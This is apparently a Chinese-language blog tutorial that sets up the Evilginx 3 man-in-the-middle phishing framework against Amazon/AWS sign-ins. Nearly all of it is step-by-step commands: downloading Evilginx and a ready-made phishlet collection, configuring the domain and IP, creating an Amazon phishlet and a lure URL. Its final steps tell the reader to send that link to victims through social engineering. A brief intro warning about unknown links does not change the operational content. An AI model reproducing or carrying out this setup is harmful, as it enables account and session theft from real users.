---
title: "Evilginx 钓鱼网站实战案例教程"
description: "Evilginx项目安装配置比较复杂, 这篇文章做一个简单的案例演示"
image: "/img/evilginx.png"
keywords: ""
readingTime: true
categories: ['网络安全']
tags: ['Evilginx', 'Tutorial', '案例展示', '网络攻防']
date: 2024-08-24T19:49:52Z
draft: false
---

Evialginx是一个中间人网络攻击框架, 用来盗取用户的账号密码, 向被害人发送钓鱼链接, 被害人点击进去钓鱼网站, 此时钓鱼网站的域名跟真实网站不一样, 其他都一样, 如果输入账号密码则会泄露账号的敏感数据, 请勿打开不明链接, 看清链接网址, 基本上就能杜绝钓鱼链接. 下面展示系统安装配置过程


## 首先介绍下系统的环境
 - Debian 12
 - Evilginx 3.3
 - 工作目录/root
 - 对亚马逊账号进行钓鱼

---

## 接下来开始正式演示

### 1.下载与安装Evilginx

#### 下载evilginx
```
git clone https://github.com/kgretzky/evilginx2
```

#### 安装golang
```
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
```
```
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
```
```
export PATH=$PATH:/usr/local/go/bin
```

#### 编译evilginx
```
make build
```

#### 测试运行
```
./build/evilginx -v
```


### 2.配置evilginx

#### 编写phishlets模版(这里我直接下载)
```
git clone https://github.com/simplerhacking/Evilginx3-Phishlets.git phishlets
```

#### 创建config文件夹, 然后运行evilginx
```
mkdir config
```
```
./evilginx2/build/evilginx -c /var/config -p /var/phishlets
```

#### 进行基础配置
```
config domain 你的域名
```
```
config ipv4 bind 绑定本地网卡
```
```
config external 设定外网地址
```
```
config unauth_url https://signin.aws.amazon.com
```
#### 我的示例:
```
 domain             : testfish.xxxx.com
 external_ipv4      : 172.xxx.xxx.176
 bind_ipv4          : 172.xxx.xxx.176
 https_port         : 443
 dns_port           : 53
 unauth_url         : https://signin.aws.amazon.com
 autocert           : on
 gophish admin_url  : https://testfish.xxxxx.com:7777
 gophish api_key    : c60e5bce24856c2c4giuearyig73
 gophish insecure   : false
```
#### 配置钓鱼网站, 以亚马逊为例
```
phishlets create amazon test
```

```
phishlets hostname amazon:test amazon.xxxxx.com
```

```
phishlets enable amazon:test
```
#### 配置钓鱼链接
```
lures create amazon:test
```
```
lures get-url 0
```

### 3.配置钓鱼网站的https域名(evilginx自动配置)
 - ns1.你的域名 指向你的服务器IP
 - ns2.你的域名 指向你的服务器IP
 - 其他域名也指向你的服务器IP

### 4.通过社工手段将获取到的钓鱼链接发送给被害人


开始运行吧
```
./evilginx2/build/evilginx -c "配置目录" -p "钓鱼模版目录" -debug
```
至此整个流程就完成了!